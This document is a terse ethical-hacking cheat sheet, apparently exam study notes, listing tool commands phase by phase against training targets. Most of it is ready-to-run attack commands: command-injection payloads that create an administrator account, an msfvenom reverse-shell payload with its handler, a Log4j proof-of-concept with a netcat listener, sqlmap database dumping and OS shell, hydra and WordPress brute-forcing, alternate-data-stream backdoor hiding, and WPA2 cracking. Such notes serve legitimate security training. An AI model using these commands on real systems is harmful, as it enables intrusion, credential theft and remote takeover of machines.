🌐 Footprinting

Whois Lookup: whois.com
Netcraft, ipvoid.com, PeekYou
Ping Command:
Basic: ping www.example.com
With size & fragmentation test: ping www.certifiedhacker.com -f -l 1472
Photon:
python3 photon.py -u http://www.certifiedhacker.com -l 3 -t 200 --wayback
Web Data Extractor – Extracts emails & data
grecon – Subdomains, login pages, WordPress detection
ARIN Whois – Find IP ranges
Centrlops
SMB Access (Windows): Ctrl + L >> smb://[IP]
🔍 Scanning

GUI Tools: MegaPing, NetScanTools Pro
Nmap:
Full scan: nmap -sT -v [IP]
Aggressive: nmap -T4 -A [IP]
Hping3:
hping3 -A [IP] -p 80 -c 5
hping3 --scan 0-100 -S [IP]
hping3 -8 0-100 -S [IP] -V
Live Hosts: nmap -sn -PE [range]
Detect Web Servers: nmap -p 80,443 —script http-title [range]
🧾 Enumeration

NetBIOS (Windows)
nbtstat -a [IP], nbtstat -c, net use
NetBIOS (Linux)
nmap -sV -v --script nbstat.nse [IP]
nmap -sU -p 137 --script nbstat.nse [IP]
SNMP
snmp-check [IP]
snmpwalk -v1 -c public [IP]
nmap -sU -p 161 --script=snmp-* [IP]
LDAP
GUI: AD Explorer
CLI:
ldapsearch -h [IP] -x -s base namingcontexts
ldapsearch -h [IP] -x -b "DC=CEH,DC=com"
NFS
./superenum
python3 rpc-scan.py [IP] --rpc
DNS
dig ns [domain]
Zone Transfer: dig @[NS] [domain] axfr
Windows:
nslookup
set type=soa
[target domain]
SMTP
nmap -p 25 --script=smtp-* [IP]
🛠 Vulnerability Analysis

OpenVAS, Nessus
Nikto:
nikto -h [site] -Tuning x
nikto -h [site] -Cgidirs all
💻 System Hacking

Responder: responder -I eth0
L0pht Crack
NTFS Hiding:
type calc.exe > readme.txt:calc.exe
mklink backdoor.exe readme.txt:calc.exe
Steganography
White Space: snow -C -p "magic" readme2.txt
Tools: OpenStego, StegOnline
🐞 Malware Analysis

Static
BinText, Detect It Easy (DIE), PE Explorer, Ghidra
Dynamic
TCPView, Reg Organizer
📡 Sniffing

Wireshark: Filter - http.request.method == "POST"
MacChanger: macchanger -a eth0
Cain and Abel – ARP poison detection
Nmap: --script=sniffer-detect [IP]
🎭 Social Engineering

SET Toolkit
Netcraft Extension
💥 DoS

Anti DDoS Guardian
🎯 Session Hijacking

ZAP, Bettercap
🌍 Web Server Hacking

Ghost Eye: python3 ghost_eye.py
Httprecon GUI
Netcat: nc -vv www.moviescope.com 80
Telnet:
telnet www.moviescope.com 80
GET / HTTP/1.0
Nmap Scripts:
nmap -sV --script=http-enum [site]
nmap --script=hostmap-bfk --script-args hostmap-bfk.prefix=hostmap- [site]
nmap --script=http-trace -d [site]
nmap -sV --script=http-waf-detect [site]
🔎 Uniscan

Directories: uniscan -u http://url -q
File Check: uniscan -u http://url -we
Dynamic Scan: uniscan -u http://url -d
Brute Force
hydra -L usernames.txt -P passwords.txt ftp://[IP]
🌐 Web Application Hacking

whatweb, lbd, gobuster, dirsearch
Clickjack Detection: ClickjackPoc
WordPress:
wpscan --url http://example --enumerate u
wpscan --url http://site/wp-login.php -U users.txt -P passwords.txt
Command Injection (DVWA):
| whoami
| hostname
| dir C:\
| net user Test /Add
| net localgroup Administrators Test /Add
File Upload Vulnerability:
Payload:
msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw
Upload then:
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
run
🧨 Log4j

tar -xf jdk-8u202-linux-x64.tar.gz
mv jdk1.8.0_202 /usr/bin/
# Modify paths in poc.py
nc -lvp 9001
python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
🧬 SQL Injection

sqlmap:
sqlmap -u "http://site/viewprofile.aspx?id=1" --cookie="cookie" --dbs
sqlmap -u "... " -D db --tables
sqlmap -u "... " -D db -T table --dump
sqlmap --os-shell
DSSS:
python3 dsss.py -u "http://site/viewprofile.aspx?id=1" --cookie="cookie"
📶 Wireless Network Hacking

WEP: aircrack-ng [path.cap]
WPA2:
aircrack-ng -a2 -b [BSSID] -w [wordlist] [packet.cap]
📱 Mobile Platform Hacking

PhoneSploit: python3 phonesploit.py
APK Analysis: sisik.eu/apk-tool
📡 IoT Hacking

Shodan
MQTT Port: 1883

